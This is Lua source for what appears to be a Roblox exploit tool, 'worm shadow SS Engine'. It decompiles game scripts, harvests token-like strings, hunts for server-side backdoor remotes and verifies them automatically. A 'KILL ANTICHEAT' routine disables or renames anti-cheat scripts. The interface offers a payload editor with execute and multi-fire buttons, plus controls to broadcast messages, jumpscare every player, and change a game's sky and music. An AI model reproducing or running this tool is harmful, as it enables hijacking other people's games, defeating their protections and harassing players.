WS_BACKDOOR_PATTERNS={{pat="getgenv%s*%(",name="getgenv",sev=5},{pat="getrawmetatable",name="getrawmetatable",sev=5},{pat="hookfunction",name="hookfunction",sev=5},{pat="hookmetamethod",name="hookmetamethod",sev=5},{pat="queue_on_teleport",name="queue_on_teleport",sev=5},{pat="queueonteleport",name="queueonteleport",sev=5},{pat="setclipboard",name="setclipboard",sev=5},{pat="toclipboard",name="toclipboard",sev=5},{pat="backdoor",name="backdoor",sev=5},{pat="loadstring",name="loadstring",sev=4},{pat="require%s*%(%s*%d+%s*%)",name="require(id)",sev=4},{pat="getfenv%s*%(",name="getfenv",sev=4},{pat="setfenv%s*%(",name="setfenv",sev=4},{pat="getsenv%s*%(",name="getsenv",sev=4},{pat="getscriptbytecode",name="getscriptbytecode",sev=4},{pat="getscriptclosure",name="getscriptclosure",sev=4},{pat="executor",name="executor",sev=4},{pat="firetouchinterest",name="firetouchinterest",sev=4},{pat="fireclickdetector",name="fireclickdetector",sev=4},{pat="fireproximityprompt",name="fireproximityprompt",sev=4},{pat="syn%.request",name="syn.request",sev=5},{pat="http_request",name="http_request",sev=4},{pat="fireserver%s*%(",name="FireServer",sev=2},{pat="invokeserver%s*%(",name="InvokeServer",sev=2},{pat="remoteevent",name="RemoteEvent",sev=1},{pat="remotefunction",name="RemoteFunction",sev=1},{pat="debug%.getupvalue",name="debug.getupvalue",sev=3},{pat="debug%.getinfo",name="debug.getinfo",sev=3},{pat="debug%.getlocal",name="debug.getlocal",sev=3},{pat="debug%.setupvalue",name="debug.setupvalue",sev=3},{pat="debug%.setfenv",name="debug.setfenv",sev=3}}
function collectVisibleScripts() local out={} local seen={} local roots={S.Replicated,workspace,game:GetService("StarterPlayer"),game:GetService("StarterGui"),game:GetService("SoundService"),game:GetService("Lighting")} if LP then local ps=LP:FindFirstChild("PlayerScripts") local pgui=LP:FindFirstChild("PlayerGui") local bp=LP:FindFirstChild("Backpack") if ps then table.insert(roots,ps) end if pgui then table.insert(roots,pgui) end if bp then table.insert(roots,bp) end end for _,root in ipairs(roots) do if root then pcall(function() for _,obj in ipairs(root:GetDescendants()) do if obj:IsA("LuaSourceContainer") and not seen[obj] then seen[obj]=true table.insert(out,obj) end end end) end end return out end
function getScriptSource(obj) if not obj then return nil end local c=ST.ScriptCache[obj] if c and c.source then return c.source,c.decoded end if WS_HAS_DECOMPILE then local ok,dec=pcall(decompile,obj) if ok and type(dec)=="string" and #dec>0 then ST.ScriptCache[obj]={source=dec,size=#dec,decoded=true,ts=os.time()} ST.ScriptsDecompiled=ST.ScriptsDecompiled+1 return dec,true end end if WS_HAS_BYTECODE then local ok,bc=pcall(getscriptbytecode,obj) if ok and type(bc)=="string" and #bc>0 then local isSrc=bc:find("function") or bc:find("local ") or bc:find("\nend") ST.ScriptCache[obj]={source=bc,size=#bc,decoded=isSrc and true or false,ts=os.time()} if isSrc then ST.ScriptsDecompiled=ST.ScriptsDecompiled+1 return bc,true end return bc,false end end return nil,false end
function scanScriptForPatterns(src) local hits={} if not src then return hits end local lower=src:lower() for _,e in ipairs(WS_BACKDOOR_PATTERNS) do local s=lower:find(e.pat,1,false) if s then local ex=math.max(1,s-15) local ee=math.min(#src,s+70) table.insert(hits,{name=e.name,sev=e.sev,pos=s,snippet=src:sub(ex,ee):gsub("\n"," ")}) end end return hits end
function harvestTokensFromScript(src) if not src or not CFG.SCRIPT_TOKEN_HARVEST then return 0 end local cnt=0 for lit in src:gmatch('"([^"]+)"') do if looksLikeToken(lit) then ST.TokenPool[lit]=(ST.TokenPool[lit] or 0)+3 cnt=cnt+1 end end for lit in src:gmatch("'([^']+)'") do if looksLikeToken(lit) then ST.TokenPool[lit]=(ST.TokenPool[lit] or 0)+3 cnt=cnt+1 end end return cnt end
AUTO_REMOTE_PATTERNS={{pat='([%w_]+)%s*:%s*FireServer%s*%('},{pat='([%w_]+)%s*:%s*InvokeServer%s*%('},{pat=':WaitForChild%s*%(%s*"([^"]+)"%s*%)'},{pat=':FindFirstChild%s*%(%s*"([^"]+)"%s*%)'},{pat='ReplicatedStorage%.([%w_]+)'}}
function extractRemoteNames(src) if not src then return {} end local f={} for _,e in ipairs(AUTO_REMOTE_PATTERNS) do for cap in src:gmatch(e.pat) do if #cap>=3 and #cap<=64 then local lower=cap:lower() if not lower:match("^%d+$") and lower~="parent" and lower~="name" and lower~="text" and lower~="value" and lower~="script" then f[cap]=(f[cap] or 0)+1 end end end end return f end
function findRemoteByName(name) if not name or name=="" then return nil end local roots={S.Replicated,workspace} if LP then local pg=LP:FindFirstChild("PlayerGui") if pg then table.insert(roots,pg) end end for _,root in ipairs(roots) do if root then local ok,found=pcall(function() for _,d in ipairs(root:GetDescendants()) do if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction")) and d.Name==name then return d end end end) if ok and found then return found end end end return nil end
function autoAttachFromScripts() if not ST.ScriptCache then return 0 end local att=0 for obj,cache in pairs(ST.ScriptCache) do local src=cache.source if src then local names=extractRemoteNames(src) for name,_ in pairs(names) do local remote=findRemoteByName(name) if remote then if not ST.AutoAttached[remote] then ST.AutoAttached[remote]={source=obj:GetFullName(),ts=os.time()} table.insert(ST.PendingCandidates,remote) att=att+1 log("   auto-attach: "..remote:GetFullName()) end end end end end return att end
function autoVerifyPending() if #ST.PendingCandidates==0 then return 0,0 end local v=0 local c=0 local limit=math.min(#ST.PendingCandidates,20) for i=1,limit do local r=ST.PendingCandidates[i] if r and r.Parent then c=c+1 if verifyBackdoor(r) then v=v+1 log("   AUTO-VERIFIED: "..r:GetFullName()) if not ST.Backdoor then ST.Backdoor=r ST.FoundBy="auto-attach" end end end task.wait(0.1) end return v,c end
function killLocalAnticheat() local killed=0 local targets={} local ac_names={"anticheat","anti-cheat","anti_cheat","acclient","antiexploit","sentry","guard","shield","protect","detector","honeypot","watchdog","antitamper","integrity","audit"} local function isAc(n) local l=n:lower() for _,a in ipairs(ac_names) do if l==a or l:find(a,1,true) then return true end end return false end if LP then local pg=LP:FindFirstChild("PlayerGui") if pg then for _,d in ipairs(pg:GetDescendants()) do if isAc(d.Name) then table.insert(targets,d) end end end local ps=LP:FindFirstChild("PlayerScripts") if ps then for _,d in ipairs(ps:GetDescendants()) do if isAc(d.Name) then table.insert(targets,d) end end end end local rs=S.Replicated if rs then for _,d in ipairs(rs:GetDescendants()) do if isAc(d.Name) and (d:IsA("LocalScript") or d:IsA("ModuleScript") or d:IsA("Folder") or d:IsA("Script")) then table.insert(targets,d) end end end for _,d in ipairs(workspace:GetDescendants()) do if isAc(d.Name) and (d:IsA("LocalScript") or d:IsA("ModuleScript") or d:IsA("Script")) then table.insert(targets,d) end end for _,t in ipairs(targets) do local ok,full=pcall(function() return t:GetFullName() end) if ok then local succ=pcall(function() if t:IsA("LocalScript") then t.Disabled=true elseif t:IsA("ModuleScript") then t.Name="_killed_"..t.Name elseif t:IsA("Script") then t.Disabled=true elseif t:IsA("Folder") then for _,c in ipairs(t:GetDescendants()) do if c:IsA("LocalScript") then c.Disabled=true end if c:IsA("ModuleScript") then c.Name="_killed_"..c.Name end end end ST.AntiCheatKilled[t]=true end) if succ then killed=killed+1 log("   AC killed: "..full) end end end ST.AntiCheatActive=killed>0 notify("worm shadow","AC killed: "..killed,5) return killed end
function runFullScriptScan() if not WS_HAS_BYTECODE and not WS_HAS_DECOMPILE then notify("worm shadow","no script API",5) return end if ST.ScriptScanActive then return end ST.ScriptScanActive=true ST.ScriptFindings={} ST.ScriptCache={} ST.ScriptsScanned=0 ST.ScriptsDecompiled=0 ST.ScriptTokensHarvested=0 local scripts=collectVisibleScripts() log("script scan: "..#scripts.." found") for i,obj in ipairs(scripts) do if i%10==0 then task.wait() end local src,decoded=getScriptSource(obj) if src then ST.ScriptsScanned=ST.ScriptsScanned+1 local hits=scanScriptForPatterns(src) if #hits>0 then table.insert(ST.ScriptFindings,{script=obj,path=obj:GetFullName(),class=obj.ClassName,hits=hits,decoded=decoded,size=#src}) end local tks=harvestTokensFromScript(src) ST.ScriptTokensHarvested=ST.ScriptTokensHarvested+tks end end ST.ScriptScanActive=false log(string.format("scan: %d scanned, %d decompiled, %d findings, %d tokens",ST.ScriptsScanned,ST.ScriptsDecompiled,#ST.ScriptFindings,ST.ScriptTokensHarvested)) if CFG.AUTO_ATTACH then pcall(autoAttachFromScripts) if CFG.AUTO_VERIFY_ATTACHED then pcall(autoVerifyPending) end end notify("worm shadow",string.format("scripts: %d findings / %d tokens",#ST.ScriptFindings,ST.ScriptTokensHarvested),6) end
if PG:FindFirstChild("WormShadowSS") then PG.WormShadowSS:Destroy() end
C={Bg=Color3.fromRGB(10,11,14),Panel=Color3.fromRGB(18,20,24),Alt=Color3.fromRGB(24,27,32),Acc=Color3.fromRGB(46,204,113),Acc2=Color3.fromRGB(0,191,255),Warn=Color3.fromRGB(255,170,0),Danger=Color3.fromRGB(231,76,60),Pink=Color3.fromRGB(212,100,150),Text=Color3.fromRGB(240,240,240),Mute=Color3.fromRGB(150,150,150),Bd=Color3.fromRGB(45,52,64)}
GUI=Instance.new("ScreenGui")
GUI.Name="WormShadowSS"
GUI.ResetOnSpawn=false
GUI.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
GUI.Parent=PG
Main=Instance.new("Frame")
Main.Size=UDim2.new(0,640,0,560)
Main.Position=UDim2.new(0.5,-320,0.5,-280)
Main.BackgroundColor3=C.Bg
Main.BorderSizePixel=0
Main.Active=true
Main.Parent=GUI
Instance.new("UICorner",Main).CornerRadius=UDim.new(0,10)
bd=Instance.new("UIStroke",Main)
bd.Color=C.Bd bd.Thickness=1.5
TB=Instance.new("Frame")
TB.Size=UDim2.new(1,0,0,34)
TB.BackgroundColor3=C.Panel
TB.BorderSizePixel=0
TB.Parent=Main
Instance.new("UICorner",TB).CornerRadius=UDim.new(0,10)
TT=Instance.new("TextLabel")
TT.Size=UDim2.new(1,-80,1,0)
TT.Position=UDim2.new(0,14,0,0)
TT.BackgroundTransparency=1
TT.Text="worm shadow  |  SS Engine v5.7"
TT.Font=Enum.Font.GothamBold
TT.TextSize=13
TT.TextColor3=C.Text
TT.TextXAlignment=Enum.TextXAlignment.Left
TT.Parent=TB
MinBtn=Instance.new("TextButton")
MinBtn.Size=UDim2.new(0,24,0,24)
MinBtn.Position=UDim2.new(1,-56,0,5)
MinBtn.BackgroundColor3=C.Alt
MinBtn.Text="-"
MinBtn.Font=Enum.Font.GothamBold
MinBtn.TextSize=14
MinBtn.TextColor3=C.Text
MinBtn.BorderSizePixel=0
MinBtn.Parent=TB
Instance.new("UICorner",MinBtn).CornerRadius=UDim.new(0,6)
CloseBtn=Instance.new("TextButton")
CloseBtn.Size=UDim2.new(0,24,0,24)
CloseBtn.Position=UDim2.new(1,-30,0,5)
CloseBtn.BackgroundColor3=C.Danger
CloseBtn.Text="X"
CloseBtn.Font=Enum.Font.GothamBold
CloseBtn.TextSize=16
CloseBtn.TextColor3=Color3.new(1,1,1)
CloseBtn.BorderSizePixel=0
CloseBtn.Parent=TB
Instance.new("UICorner",CloseBtn).CornerRadius=UDim.new(0,6)
TabBar=Instance.new("Frame")
TabBar.Size=UDim2.new(1,-20,0,30)
TabBar.Position=UDim2.new(0,10,0,40)
TabBar.BackgroundColor3=C.Panel
TabBar.BorderSizePixel=0
TabBar.Parent=Main
Instance.new("UICorner",TabBar).CornerRadius=UDim.new(0,6)
TabsOrder={"SCAN","EXEC","CONTROL","ADMIN","HUB"}
TabButtons={}
TabContents={}
for i,name in ipairs(TabsOrder) do local b=Instance.new("TextButton") b.Size=UDim2.new(0.2,-2,1,0) b.Position=UDim2.new((i-1)*0.2+0.002,0,0,0) b.BackgroundColor3=C.Panel b.BackgroundTransparency=1 b.Text=name b.Font=Enum.Font.GothamBold b.TextSize=11 b.TextColor3=C.Mute b.BorderSizePixel=0 b.Parent=TabBar Instance.new("UICorner",b).CornerRadius=UDim.new(0,6) TabButtons[name]=b end
Content=Instance.new("Frame")
Content.Size=UDim2.new(1,-20,1,-160)
Content.Position=UDim2.new(0,10,0,76)
Content.BackgroundColor3=C.Alt
Content.BorderSizePixel=0
Content.Parent=Main
Instance.new("UICorner",Content).CornerRadius=UDim.new(0,6)
cStroke=Instance.new("UIStroke",Content)
cStroke.Color=C.Bd cStroke.Thickness=1
for _,name in ipairs(TabsOrder) do local sf=Instance.new("ScrollingFrame") sf.Size=UDim2.new(1,-8,1,-8) sf.Position=UDim2.new(0,4,0,4) sf.BackgroundTransparency=1 sf.BorderSizePixel=0 sf.ScrollBarThickness=4 sf.ScrollBarImageColor3=C.Acc sf.CanvasSize=UDim2.new(0,0,0,0) sf.AutomaticCanvasSize=Enum.AutomaticSize.Y sf.Visible=(name=="SCAN") sf.Parent=Content TabContents[name]=sf end
function switchTab(name) for _,n in ipairs(TabsOrder) do TabContents[n].Visible=(n==name) if n==name then pcall(function() TabContents[n].CanvasPosition=Vector2.new(0,0) end) end TabButtons[n].BackgroundTransparency=(n==name) and 0 or 1 TabButtons[n].BackgroundColor3=C.Panel TabButtons[n].TextColor3=(n==name) and C.Acc or C.Mute end end
for _,name in ipairs(TabsOrder) do TabButtons[name].MouseButton1Click:Connect(function() switchTab(name) end) end
StatBar=Instance.new("Frame")
StatBar.Size=UDim2.new(1,-20,0,26)
StatBar.Position=UDim2.new(0,10,1,-56)
StatBar.BackgroundColor3=C.Panel
StatBar.BorderSizePixel=0
StatBar.Parent=Main
Instance.new("UICorner",StatBar).CornerRadius=UDim.new(0,6)
StatDot=Instance.new("Frame")
StatDot.Size=UDim2.new(0,8,0,8)
StatDot.Position=UDim2.new(0,10,0.5,-4)
StatDot.BackgroundColor3=C.Mute
StatDot.BorderSizePixel=0
StatDot.Parent=StatBar
Instance.new("UICorner",StatDot).CornerRadius=UDim.new(1,0)
StatText=Instance.new("TextLabel")
StatText.Size=UDim2.new(1,-30,1,0)
StatText.Position=UDim2.new(0,26,0,0)
StatText.BackgroundTransparency=1
StatText.Text="idle"
StatText.Font=Enum.Font.Code
StatText.TextSize=12
StatText.TextColor3=C.Mute
StatText.TextXAlignment=Enum.TextXAlignment.Left
StatText.Parent=StatBar
Footer=Instance.new("TextLabel")
Footer.Size=UDim2.new(1,-20,0,16)
Footer.Position=UDim2.new(0,10,1,-24)
Footer.BackgroundTransparency=1
Footer.Text="v5.7 - auto-attach + AC killer"
Footer.Font=Enum.Font.Code
Footer.TextSize=10
Footer.TextColor3=C.Mute
Footer.TextXAlignment=Enum.TextXAlignment.Left
Footer.Parent=Main
Mini=Instance.new("TextButton")
Mini.Size=UDim2.new(0,44,0,44)
Mini.Position=UDim2.new(0,20,0.5,-22)
Mini.BackgroundColor3=C.Bg
Mini.Text="W"
Mini.Font=Enum.Font.GothamBold
Mini.TextSize=20
Mini.TextColor3=C.Acc
Mini.Visible=false
Mini.BorderSizePixel=0
Mini.Parent=GUI
Instance.new("UICorner",Mini).CornerRadius=UDim.new(0,10)
mStroke=Instance.new("UIStroke",Mini)
mStroke.Color=C.Acc mStroke.Thickness=1.5
function setStatus(text,color) StatText.Text=text StatDot.BackgroundColor3=color or C.Mute end
function sectionLabel(parent,text,y) local l=Instance.new("TextLabel") l.Size=UDim2.new(1,-20,0,16) l.Position=UDim2.new(0,10,0,y) l.BackgroundTransparency=1 l.Text=text l.Font=Enum.Font.GothamBold l.TextSize=10 l.TextColor3=C.Mute l.TextXAlignment=Enum.TextXAlignment.Left l.Parent=parent return l end
function makeBtn(parent,text,color,w,x,y,h) local b=Instance.new("TextButton") b.Size=UDim2.new(0,w,0,h or 28) b.Position=UDim2.new(0,x,0,y) b.BackgroundColor3=C.Panel b.Text=text b.Font=Enum.Font.GothamBold b.TextSize=11 b.TextColor3=color b.BorderSizePixel=0 b.AutoButtonColor=true b.Parent=parent Instance.new("UICorner",b).CornerRadius=UDim.new(0,6) local s=Instance.new("UIStroke",b) s.Color=color s.Thickness=1 s.Transparency=0.6 return b end
function makeInput(parent,placeholder,w,x,y,text) local t=Instance.new("TextBox") t.Size=UDim2.new(0,w,0,28) t.Position=UDim2.new(0,x,0,y) t.BackgroundColor3=C.Panel t.PlaceholderText=placeholder t.PlaceholderColor3=C.Mute t.Text=text or "" t.Font=Enum.Font.Code t.TextSize=11 t.TextColor3=C.Text t.ClearTextOnFocus=false t.BorderSizePixel=0 t.Parent=parent Instance.new("UICorner",t).CornerRadius=UDim.new(0,6) local s=Instance.new("UIStroke",t) s.Color=C.Bd s.Thickness=1 return t end

ScanTab=TabContents["SCAN"]
sectionLabel(ScanTab,"SCAN METHODS",6)
ScanRow=Instance.new("Frame")
ScanRow.Size=UDim2.new(1,-20,0,28)
ScanRow.Position=UDim2.new(0,10,0,24)
ScanRow.BackgroundTransparency=1
ScanRow.Parent=ScanTab
ScanAllBtn=makeBtn(ScanRow,"SCAN ALL",C.Acc,100,0,0)
RouteBtn=makeBtn(ScanRow,"ROUTE",C.Acc2,80,106,0)
SingleBtn=makeBtn(ScanRow,"SINGLE",C.Acc2,80,192,0)
PartBtn=makeBtn(ScanRow,"PART",C.Acc2,80,278,0)
HeadBtn=makeBtn(ScanRow,"HEAD",C.Warn,80,364,0)
BruteBtn=makeBtn(ScanRow,"BRUTE",C.Danger,80,450,0)
ProbeBtn=makeBtn(ScanRow,"PROBE",C.Mute,80,536,0)
sectionLabel(ScanTab,"LOCK CONTROL",60)
LockRow=Instance.new("Frame")
LockRow.Size=UDim2.new(1,-20,0,28)
LockRow.Position=UDim2.new(0,10,0,78)
LockRow.BackgroundTransparency=1
LockRow.Parent=ScanTab
UnlockBtn=makeBtn(LockRow,"UNLOCK SCANNER",C.Warn,200,0,0)
LockStatusLbl=Instance.new("TextLabel")
LockStatusLbl.Size=UDim2.new(0,260,1,0)
LockStatusLbl.Position=UDim2.new(0,210,0,0)
LockStatusLbl.BackgroundTransparency=1
LockStatusLbl.Text="state: idle"
LockStatusLbl.Font=Enum.Font.Code
LockStatusLbl.TextSize=11
LockStatusLbl.TextColor3=C.Mute
LockStatusLbl.TextXAlignment=Enum.TextXAlignment.Left
LockStatusLbl.Parent=LockRow
sectionLabel(ScanTab,"OPTIONS",114)
OptRow=Instance.new("Frame")
OptRow.Size=UDim2.new(1,-20,0,28)
OptRow.Position=UDim2.new(0,10,0,132)
OptRow.BackgroundTransparency=1
OptRow.Parent=ScanTab
AutoExecBtn=makeBtn(OptRow,"AUTO-EXEC: OFF",C.Mute,100,0,0)
KeepAliveBtn1=makeBtn(OptRow,"KEEP-ALIVE: ON",C.Acc,100,106,0)
BruteModeBtn=makeBtn(OptRow,"BRUTE: PAR",C.Acc2,100,212,0)
PlayerFilterBtn=makeBtn(OptRow,"PLAYER: TEST",C.Acc,100,318,0)
ArgHookBtn=makeBtn(OptRow,"ARG-HOOK: OFF",C.Mute,100,424,0)
AutoRetryBtn=makeBtn(OptRow,"RETRY: ON",C.Acc,100,530,0)
sectionLabel(ScanTab,"TOKEN INTEL",154)
TokRow=Instance.new("Frame")
TokRow.Size=UDim2.new(1,-20,0,28)
TokRow.Position=UDim2.new(0,10,0,172)
TokRow.BackgroundTransparency=1
TokRow.Parent=ScanTab
TokenCrackBtn=makeBtn(TokRow,"CRACK: ON",C.Acc,100,0,0)
TokenDumpBtn=makeBtn(TokRow,"DUMP",C.Acc2,80,106,0)
TokenExportBtn=makeBtn(TokRow,"SAVE",C.Mute,80,192,0)
TokenImportBtn=makeBtn(TokRow,"LOAD",C.Mute,80,278,0)
IntelSaveBtn=makeBtn(TokRow,"SAVE INTEL",C.Mute,100,364,0)
ScriptScanBtn=makeBtn(TokRow,"SCRIPT SCAN",C.Pink,110,470,0)
sectionLabel(ScanTab,"SECURITY",208)
ACRow=Instance.new("Frame")
ACRow.Size=UDim2.new(1,-20,0,28)
ACRow.Position=UDim2.new(0,10,0,226)
ACRow.BackgroundTransparency=1
ACRow.Parent=ScanTab
KillACBtn=makeBtn(ACRow,"KILL ANTICHEAT",C.Danger,160,0,0)
RestoreACBtn=makeBtn(ACRow,"AC INFO",C.Mute,100,166,0)
AutoAttachBtn=makeBtn(ACRow,"AUTO-ATTACH: ON",C.Acc,160,272,0)
sectionLabel(ScanTab,"INFO",262)
InfoBox=Instance.new("Frame")
InfoBox.Size=UDim2.new(1,-20,0,130)
InfoBox.Position=UDim2.new(0,10,0,280)
InfoBox.BackgroundColor3=C.Panel
InfoBox.BorderSizePixel=0
InfoBox.Parent=ScanTab
Instance.new("UICorner",InfoBox).CornerRadius=UDim.new(0,6)
InfoLbl=Instance.new("TextLabel")
InfoLbl.Size=UDim2.new(1,-16,1,-8)
InfoLbl.Position=UDim2.new(0,8,0,4)
InfoLbl.BackgroundTransparency=1
InfoLbl.Text="..."
InfoLbl.Font=Enum.Font.Code
InfoLbl.TextSize=10
InfoLbl.TextColor3=C.Mute
InfoLbl.TextXAlignment=Enum.TextXAlignment.Left
InfoLbl.TextYAlignment=Enum.TextYAlignment.Top
InfoLbl.TextWrapped=true
InfoLbl.Parent=InfoBox
sectionLabel(ScanTab,"LOG",418)
LogBox=Instance.new("Frame")
LogBox.Size=UDim2.new(1,-20,0,170)
LogBox.Position=UDim2.new(0,10,0,436)
LogBox.BackgroundColor3=C.Panel
LogBox.BorderSizePixel=0
LogBox.Parent=ScanTab
Instance.new("UICorner",LogBox).CornerRadius=UDim.new(0,6)
LogLbl=Instance.new("TextLabel")
LogLbl.Size=UDim2.new(1,-16,1,-8)
LogLbl.Position=UDim2.new(0,8,0,4)
LogLbl.BackgroundTransparency=1
LogLbl.Text=""
LogLbl.Font=Enum.Font.Code
LogLbl.TextSize=10
LogLbl.TextColor3=C.Mute
LogLbl.TextXAlignment=Enum.TextXAlignment.Left
LogLbl.TextYAlignment=Enum.TextYAlignment.Top
LogLbl.TextWrapped=true
LogLbl.Parent=LogBox
function updateInfo() local hitsTxt="" if #ST.AllHits>0 then hitsTxt="\nhits: "..#ST.AllHits for _,h in ipairs(ST.AllHits) do hitsTxt=hitsTxt.." ["..h.name.."]" end end local ic=0 for _ in pairs(ST.ArgIntel) do ic=ic+1 end local tc=0 for _ in pairs(ST.TokenPool) do tc=tc+1 end local hc=0 for _ in pairs(ST.ResponseHints) do hc=hc+1 end local cc=0 for _ in pairs(ST.TokenCracked) do cc=cc+1 end local atc=0 for _ in pairs(ST.AutoAttached) do atc=atc+1 end local ack=0 for _ in pairs(ST.AntiCheatKilled) do ack=ack+1 end InfoLbl.Text=string.format("remotes: %d  tested: %d  skipped: %d\nfound by: %s  tagged: %d\nbackdoor: %s\nverify: %d / %d rejected\nfails: %d  retries: %d  conf: %d%%\nlocked: %s  keep-alive: %s  filter: %s\nVB: %d  intel: %d  tokens: %d  hints: %d  cracked: %d\nhook: %s  route: %d  crack-att: %d  hit: %d\nscripts: %d cached | %d findings | %d tokens\nauto-attach: %d  pending: %d  AC: %d%s",ST.TestedCount,ST.PlayerOwnedTested,ST.SkippedPlayerOwned,ST.FoundBy,#ST.Tagged,ST.Backdoor and ST.Backdoor:GetFullName() or "-",ST.VerifyAttempts,ST.VerifyRejects,#ST.FailureLog,ST.RetryRuns,ST.BackdoorConfidence,ST.Locked and "YES" or "no",ST.KeepAlive and "on" or "off",CFG.STRICT_PLAYER_FILTER and "STRICT" or "TEST",#(ST.ValueBaseCache or {}),ic,tc,hc,cc,ST.HookEnabled and "ON" or "off",ST.ProtectedHits,ST.CrackAttempts,ST.CrackHits,ST.ScriptsScanned,#ST.ScriptFindings,ST.ScriptTokensHarvested,atc,#ST.PendingCandidates,ack,hitsTxt) if ST.Locked then LockStatusLbl.Text="state: LOCKED ("..(ST.Backdoor and ST.Backdoor.Name or "?")..")" LockStatusLbl.TextColor3=C.Acc else LockStatusLbl.Text="state: idle" LockStatusLbl.TextColor3=C.Mute end end
ScanBtns={ScanAllBtn,RouteBtn,SingleBtn,PartBtn,HeadBtn,BruteBtn,ProbeBtn}
function lockScan(v) for _,b in ipairs(ScanBtns) do b.Active=not v end end
function applyLockedVisual() if ST.Locked then for _,b in ipairs(ScanBtns) do b.TextColor3=C.Mute end else ScanAllBtn.TextColor3=C.Acc RouteBtn.TextColor3=C.Acc2 SingleBtn.TextColor3=C.Acc2 PartBtn.TextColor3=C.Acc2 HeadBtn.TextColor3=C.Warn BruteBtn.TextColor3=C.Danger ProbeBtn.TextColor3=C.Mute end end
ExecTab=TabContents["EXEC"]
sectionLabel(ExecTab,"EDITOR",6)
EditorFrame=Instance.new("Frame")
EditorFrame.Size=UDim2.new(1,-20,0,200)
EditorFrame.Position=UDim2.new(0,10,0,24)
EditorFrame.BackgroundColor3=C.Bg
EditorFrame.BorderSizePixel=0
EditorFrame.ClipsDescendants=true
EditorFrame.Parent=ExecTab
Instance.new("UICorner",EditorFrame).CornerRadius=UDim.new(0,6)
Instance.new("UIStroke",EditorFrame).Color=C.Bd
EditorScroll=Instance.new("ScrollingFrame")
EditorScroll.Size=UDim2.new(1,-8,1,-8)
EditorScroll.Position=UDim2.new(0,4,0,4)
EditorScroll.BackgroundTransparency=1
EditorScroll.BorderSizePixel=0
EditorScroll.ScrollBarThickness=4
EditorScroll.ScrollBarImageColor3=C.Acc
EditorScroll.CanvasSize=UDim2.new(0,0,0,0)
EditorScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
EditorScroll.Parent=EditorFrame
LineNums=Instance.new("TextLabel")
LineNums.Size=UDim2.new(0,32,0,200)
LineNums.Position=UDim2.new(0,2,0,0)
LineNums.BackgroundTransparency=1
LineNums.Text="1"
LineNums.Font=Enum.Font.Code
LineNums.TextSize=13
LineNums.TextColor3=Color3.fromRGB(100,100,110)
LineNums.TextXAlignment=Enum.TextXAlignment.Right
LineNums.TextYAlignment=Enum.TextYAlignment.Top
LineNums.Parent=EditorScroll
HLLabel=Instance.new("TextLabel")
HLLabel.Size=UDim2.new(1,-44,0,200)
HLLabel.Position=UDim2.new(0,40,0,0)
HLLabel.BackgroundTransparency=1
HLLabel.RichText=true
HLLabel.Text=""
HLLabel.Font=Enum.Font.Code
HLLabel.TextSize=13
HLLabel.TextColor3=C.Text
HLLabel.TextXAlignment=Enum.TextXAlignment.Left
HLLabel.TextYAlignment=Enum.TextYAlignment.Top
HLLabel.TextWrapped=false
HLLabel.Parent=EditorScroll
CodeBox=Instance.new("TextBox")
CodeBox.Size=UDim2.new(1,-44,0,200)
CodeBox.Position=UDim2.new(0,40,0,0)
CodeBox.BackgroundTransparency=1
CodeBox.Text=""
CodeBox.PlaceholderText="-- payload --"
CodeBox.PlaceholderColor3=C.Mute
CodeBox.Font=Enum.Font.Code
CodeBox.TextSize=13
CodeBox.TextColor3=Color3.fromRGB(255,255,255)
CodeBox.TextTransparency=1
CodeBox.TextXAlignment=Enum.TextXAlignment.Left
CodeBox.TextYAlignment=Enum.TextYAlignment.Top
CodeBox.ClearTextOnFocus=false
CodeBox.MultiLine=true
CodeBox.TextWrapped=false
CodeBox.Parent=EditorScroll
CodeBox:GetPropertyChangedSignal("Text"):Connect(function() local src=CodeBox.Text if src=="" then HLLabel.Text="" else HLLabel.Text=highlight(src).."\n" end local lines=select(2,src:gsub("\n",""))+1 local h=math.max(200,lines*17+20) HLLabel.Size=UDim2.new(1,-44,0,h) CodeBox.Size=UDim2.new(1,-44,0,h) local nums={} for i=1,lines do nums[i]=tostring(i) end LineNums.Text=table.concat(nums,"\n") LineNums.Size=UDim2.new(0,32,0,h) end)
sectionLabel(ExecTab,"ACTIONS",230)
ExecRow=Instance.new("Frame")
ExecRow.Size=UDim2.new(1,-20,0,28)
ExecRow.Position=UDim2.new(0,10,0,248)
ExecRow.BackgroundTransparency=1
ExecRow.Parent=ExecTab
ExecBtn=makeBtn(ExecRow,"EXECUTE",C.Acc,100,0,0)
ExecClear=makeBtn(ExecRow,"CLEAR",C.Mute,80,106,0)
MultiExec=makeBtn(ExecRow,"MULTI-FIRE",C.Acc2,100,192,0)
SaveBtn=makeBtn(ExecRow,"SAVE",C.Mute,80,298,0)
LoadBtn=makeBtn(ExecRow,"LOAD",C.Mute,80,384,0)
sectionLabel(ExecTab,"PRESET LIBRARY",284)
PresetRow=Instance.new("Frame")
PresetRow.Size=UDim2.new(1,-20,0,800)
PresetRow.Position=UDim2.new(0,10,0,302)
PresetRow.BackgroundTransparency=1
PresetRow.Parent=ExecTab
Instance.new("UIListLayout",PresetRow).Padding=UDim.new(0,4)
for _,p in ipairs(PRESETS) do local b=makeBtn(PresetRow,p.name,C.Acc2,260,0,0) b.Size=UDim2.new(1,0,0,26) b.MouseButton1Click:Connect(function() CodeBox.Text=p.code switchTab("EXEC") setStatus("loaded: "..p.name,C.Acc2) end) end
CtrlTab=TabContents["CONTROL"]
sectionLabel(CtrlTab,"BROADCAST",6)
BcInput=makeInput(CtrlTab,"message...",380,10,24)
BcSendBtn=makeBtn(CtrlTab,"BROADCAST",C.Pink,100,396,24)
sectionLabel(CtrlTab,"JUMPSCARE",60)
ScareTargetInput=makeInput(CtrlTab,"username or blank for all",240,10,78,"")
ScareTargetBtn=makeBtn(CtrlTab,"TARGET: ALL",C.Acc2,130,256,78)
ScareRepeatBtn=makeBtn(CtrlTab,"REPEAT: OFF",C.Mute,130,392,78)
JumpBtn=makeBtn(CtrlTab,"SCARE",C.Danger,200,10,112)
sectionLabel(CtrlTab,"HINT",148)
HintInput=makeInput(CtrlTab,"hint text...",380,10,166,"worm shadow was here")
HintBtn=makeBtn(CtrlTab,"HINT",C.Acc2,100,396,166)
sectionLabel(CtrlTab,"SKY",202)
SkyInput=makeInput(CtrlTab,"sky texture id...",380,10,220,"130087664524149")
SkyBtn=makeBtn(CtrlTab,"CHANGE SKY",C.Acc2,100,396,220)
sectionLabel(CtrlTab,"MUSIC",256)
MusicInput=makeInput(CtrlTab,"audio id...",280,10,274,"90289127130880")
